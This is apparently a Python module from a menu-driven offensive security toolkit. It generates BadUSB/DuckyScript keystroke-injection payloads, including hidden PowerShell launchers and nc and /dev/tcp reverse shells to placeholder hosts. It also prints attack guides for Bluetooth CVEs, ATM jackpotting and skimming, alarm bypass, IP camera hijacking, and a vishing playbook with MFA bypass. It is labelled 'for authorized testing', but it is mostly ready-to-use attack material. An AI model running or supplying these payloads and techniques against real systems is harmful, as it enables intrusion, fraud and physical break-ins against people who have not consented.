from __future__ import annotations


from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table

from .utils import console, header, pause, report

# ---------------------------------------------------------------------------
# BadUSB / HID payload generator
# ---------------------------------------------------------------------------
_BADUSB_PAYLOADS = {
    "win-reverse-shell": (
        "Windows reverse shell via PowerShell (Flipper Zero / DuckyScript)",
        'DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -enc <BASE64>\nENTER'
    ),
    "win-cred-grab": (
        "Windows credential dump to pastebin-style endpoint",
        'DELAY 1000\nGUI r\nDELAY 300\nSTRING cmd /c "whoami > %TEMP%\\o.txt & ipconfig >> %TEMP%\\o.txt"\nENTER'
    ),
    "linux-reverse": (
        "Linux reverse shell via terminal",
        'DELAY 1000\nCTRL+ALT+T\nDELAY 1000\nSTRING nc -e /bin/sh <IP> <PORT>\nENTER'
    ),
    "macos-reverse": (
        "macOS reverse shell via Terminal",
        'DELAY 1000\nGUI+SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 1000\nSTRING bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\nENTER'
    ),
    "wallpaper-flip": (
        "Set wallpaper to image URL (prank / psyop)",
        'DELAY 1000\nGUI r\nDELAY 300\nSTRING powershell -c "iwr -uri <URL> -OutFile $env:TEMP\\w.jpg; Set-ItemProperty -Path \'HKCU:\\Control Panel\\Desktop\' -Name Wallpaper -Value $env:TEMP\\w.jpg; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"\nENTER'
    ),
}


def badusb_gen() -> None:
    header("BadUSB / HID Payload Generator")
    console.print("Generate DuckyScript / Flipper Zero payloads for authorized testing.\n")
    for k, (desc, _) in _BADUSB_PAYLOADS.items():
        console.print(f"  [cyan]{k}[/] — {desc}")
    choice = Prompt.ask("Payload", choices=list(_BADUSB_PAYLOADS), default="win-reverse-shell")
    desc, script = _BADUSB_PAYLOADS[choice]
    console.print(Panel(script, title=f"BadUSB — {choice}", border_style="yellow"))
    console.print(f"\n[bright_black]{desc}[/]")
    report("BadUSB gen", f"type={choice}")
    pause()


# ---------------------------------------------------------------------------
# USB attack vectors
# ---------------------------------------------------------------------------
def usb_attack() -> None:
    header("USB Attack Vectors")
    console.print("USB-based attack methodologies for authorized physical testing.\n")
    vectors = [
        ("Rubber Ducky", "HID keystroke injection via USB (DuckyScript payloads)"),
        ("Flipper Zero", "Multi-protocol: HID, NFC, Sub-GHz, RFID, IR, Bluetooth"),
        ("USB Killer", "Charge-discharge cycle to fry motherboard (destructive!)"),
        ("AutoRun exploit", "Exploit autorun.inf on older Windows (social engineering)"),
        ("Data exfil", "USB mass storage device for data exfiltration (USBee, USBee-Stealer)"),
        ("Side channel", "USB power/EM emanation for covert data exfiltration"),
        ("Device impersonation", "Fake network adapter / HID / storage to trigger driver bugs"),
    ]
    tbl = Table(title="USB Attack Vectors", border_style="yellow")
    tbl.add_column("Vector", style="cyan")
    tbl.add_column("Description")
    for v, d in vectors:
        tbl.add_row(v, d)
    console.print(tbl)
    report("USB attack", f"{len(vectors)} vectors")
    pause()


# ---------------------------------------------------------------------------
# Bluetooth attack guide
# ---------------------------------------------------------------------------
def bluetooth_attack() -> None:
    header("Bluetooth Attack Guide")
    console.print("Bluetooth exploitation methodology for authorized testing.\n")
    attacks = [
        ("Recon", "hcitool scan / bluetoothctl for nearby devices"),
        ("SDP scan", "sdptool browse <BDADDR> to enumerate services"),
        ("L2CAP ping", "l2ping <BDADDR> to confirm reachability"),
        ("BlueBorne", "RCE via L2CAP (CVE-2017-1000251, -1000250)"),
        ("KNOB attack", "Force 1-byte encryption key (CVE-2019-9506)"),
        ("BLURtooth", "Cross-transport key derivation attack (CVE-2020-15803)"),
        ("BLE sniffing", "Ubertooth / nRF Sniffer for BLE traffic capture"),
        ("BLE spoofing", "Spoof BLE GATT services for MITM"),
    ]
    for label, desc in attacks:
        console.print(f"  [cyan]{label}[/] — {desc}")
    console.print("\n  [yellow]Tools:[/] hcitool, sdptool, l2ping, Ubertooth, Bettercap, BlueZ")
    report("Bluetooth guide", f"{len(attacks)} techniques")
    pause()


# ---------------------------------------------------------------------------
# ATM jackpotting guide
# ---------------------------------------------------------------------------
def atm_info() -> None:
    header("ATM Attack Guide (Educational)")
    console.print("ATM attack methodologies for authorized security assessment.\n")
    attacks = [
        ("Physical access", "Safe door, top cabinet, USB ports, diagnostic key"),
        ("Multivendor", "Diebold, NCR, Triton, Hyosung — each has unique vulns"),
        ("Software", "Windows XP/7 based, RCE via service ports, XFS middleware"),
        ("Network", "TLS/SSL interception, ATM network pivot to bank infra"),
        ("Cash cassette", "Dispenser commands via XFS API (authorized testing only)"),
        ("Skimming", "Card reader overlays, hidden cameras, deep insert skimmers"),
        ("Shimming", "Chip-based skimming via micro-embedded shimmer"),
    ]
    for label, desc in attacks:
        console.print(f"  [cyan]{label}[/] — {desc}")
    report("ATM guide", f"{len(attacks)} techniques")
    pause()


# ---------------------------------------------------------------------------
# Alarm bypass guide
# ---------------------------------------------------------------------------
def alarm_bypass() -> None:
    header("Physical Alarm Bypass Guide")
    console.print("Physical security alarm bypass for authorized testing.\n")
    techniques = [
        ("Sensor jamming", "RF jamming on wireless sensor frequencies (433/868/915 MHz)"),
        ("Magnet defeat", "Reed switch bypass with strong magnet on door/window sensors"),
        ("PIE bypass", "Passive infrared sensor avoidance (slow movement, thermal blanket)"),
        ("Glass break", "Frequency analysis to defeat acoustic glass-break sensors"),
        ("Network", "IP camera jamming, NVR exploitation, alarm panel network access"),
        ("Power", "Battery drain, power supply interruption, UPS exhaustion"),
    ]
    for label, desc in techniques:
        console.print(f"  [cyan]{label}[/] — {desc}")
    report("Alarm bypass", f"{len(techniques)} techniques")
    pause()


# ---------------------------------------------------------------------------
# Camera hijack guide
# ---------------------------------------------------------------------------
def camera_hijack() -> None:
    header("Camera Hijack Guide")
    console.print("IP camera exploitation for authorized testing.\n")
    attacks = [
        ("Default creds", "admin:admin, root:root, admin:12345 — very common"),
        ("RTSP unauth", "Open RTSP streams (cameradar, rtsp-brute)"),
        ("Firmware", "Extract firmware, find hardcoded creds or backdoors"),
        ("ONVIF abuse", "ONVIF protocol for PTZ control, snapshot, config changes"),
        ("Cloud leak", "Cloud-connected cameras (Ring, Wyze) — API token abuse"),
        ("MITM", "Intercept camera-to-NVR traffic, inject fake video feed"),
    ]
    for label, desc in attacks:
        console.print(f"  [cyan]{label}[/] — {desc}")
    console.print("\n  [yellow]Tools:[/] cameradar, Shodan, ONVIF Device Manager, iVcam")
    report("Camera hijack", f"{len(attacks)} techniques")
    pause()


# ---------------------------------------------------------------------------
# Bootloader unlock guide
# ---------------------------------------------------------------------------
def bootloader_unlock() -> None:
    header("Bootloader Unlock Guide")
    console.print("Device bootloader unlock methods for authorized testing.\n")
    devices = [
        ("Android (OEM)", "fastboot oem unlock / fastboot flashing unlock (wipes data)"),
        ("Samsung", "Download mode + Odin, or Device Unlock APK (carrier-locked)"),
        ("Google Pixel", "fastboot flashing unlock (easiest, no carrier lock)"),
        ("Xiaomi", "Mi Unlock Tool + account-bound waiting period"),
        ("Router", "Serial console access, U-Boot env modification, TFTP flash"),
        ("IoT devices", "UART/JTAG debug port, SPI flash dump, firmware replacement"),
    ]
    tbl = Table(title="Bootloader Unlock Methods", border_style="yellow")
    tbl.add_column("Device", style="cyan")
    tbl.add_column("Method")
    for dev, method in devices:
        tbl.add_row(dev, method)
    console.print(tbl)
    report("Bootloader unlock", f"{len(devices)} device types")
    pause()


# ---------------------------------------------------------------------------
# Vishing (voice phishing) playbook
# ---------------------------------------------------------------------------
def vishing_playbook() -> None:
    header("Vishing Playbook")
    console.print("Voice phishing simulation methodology for authorized red teaming.\n")
    phases = [
        ("Preparation", "Target recon (LinkedIn, org chart), pretext development, caller ID spoofing"),
        ("Pretext", "IT support, HR, executive, vendor impersonation scenarios"),
        ("Execution", "Social Engineer's Toolkit (SET), custom SIP trunk, VoIP caller ID spoof"),
        ("Credential harvest", "Fake portal URL, MFA bypass via call, OTP relay"),
        ("Persistence", "Callback verification, establish trust for future engagement"),
        ("Tools", "SET, SIP/VoIP softphone, caller ID spoof services, Evilginx (portal)"),
    ]
    for label, desc in phases:
        console.print(f"  [cyan]{label}[/] — {desc}")
    report("Vishing playbook", f"{len(phases)} phases")
    pause()


# ---------------------------------------------------------------------------
# Menu
# ---------------------------------------------------------------------------
MENU = {
    "1": ("BadUSB / HID payload generator", badusb_gen),
    "2": ("USB attack vectors", usb_attack),
    "3": ("Bluetooth attack guide", bluetooth_attack),
    "4": ("ATM attack guide", atm_info),
    "5": ("Alarm bypass guide", alarm_bypass),
    "6": ("Camera hijack guide", camera_hijack),
    "7": ("Bootloader unlock guide", bootloader_unlock),
    "8": ("Vishing playbook", vishing_playbook),
}
